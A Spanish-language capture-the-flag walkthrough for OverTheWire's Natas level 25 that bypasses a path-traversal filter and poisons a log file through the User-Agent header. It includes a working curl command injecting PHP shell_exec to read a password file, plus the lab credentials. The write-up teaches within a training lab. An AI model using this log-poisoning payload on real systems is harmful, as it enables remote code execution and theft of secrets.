# Natas 25

#### URL: http://natas25.natas.labs.overthewire.org
#### Credenciales: natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws

La pagina abre un archivo especificado por el parametro "lang" en la ruta /language/, si no se le especifica entonces abre /language/en:
``` php
 function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en"); 
    }
```

Hay una verificacion para casos de path traversal pero nos lo podemos saltar duplicando los caracteres ("....//"):
``` php
    // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
```

Intentamos `http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//etc/natas_webpass/natas26` pero no nos permite leer ese archivo.

Se almacena un archivo de registro cuyo nombre contiene el valor de nuestra cookie de sesion:
``` php
   function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
```

Aqui hay que notar que se almacena el valor de nuestro user-agent en el texto, texto que se renderizara sin escapar en la pagina. Podemos inyectar codigo php alli para leer /etc/natas_webpass/natas26. 

Con todo esto, especificamos el archivo a leer, nuestra cookie y el comando en la cabecera User-Agent:
``` bash
curl -u natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_e1eefn6p70gvree7nq70lsi2dk.log -H "Cookie: PHPSESSID=e1eefn6p70gvree7nq70lsi2dk" --user-agent "<?php echo shell_exec(\"cat /etc/natas_webpass/natas26\");?>"
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas25", "pass": "ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws" };</script></head>
<body>

<h1>natas25</h1>
<div id="content">
<div align="right">
<form>
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<option>en</option><option>de</option></select>
</form>
</div>

[21.03.2025 01::11:36] cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
 "Directory traversal attempt! fixing request."
[21.03.2025 01::11:39] cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
 "Directory traversal attempt! fixing request."
[21.03.2025 01::15:59] cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
 "Directory traversal attempt! fixing request."
<br />
<b>Notice</b>:  Undefined variable: __GREETING in <b>/var/www/natas/natas25/index.php</b> on line <b>80</b><br />
<h2></h2><br />
<b>Notice</b>:  Undefined variable: __MSG in <b>/var/www/natas/natas25/index.php</b> on line <b>81</b><br />
<p align="justify"><br />
<b>Notice</b>:  Undefined variable: __FOOTER in <b>/var/www/natas/natas25/index.php</b> on line <b>82</b><br />
<div align="right"><h6></h6><div><p>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

`natas26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE`
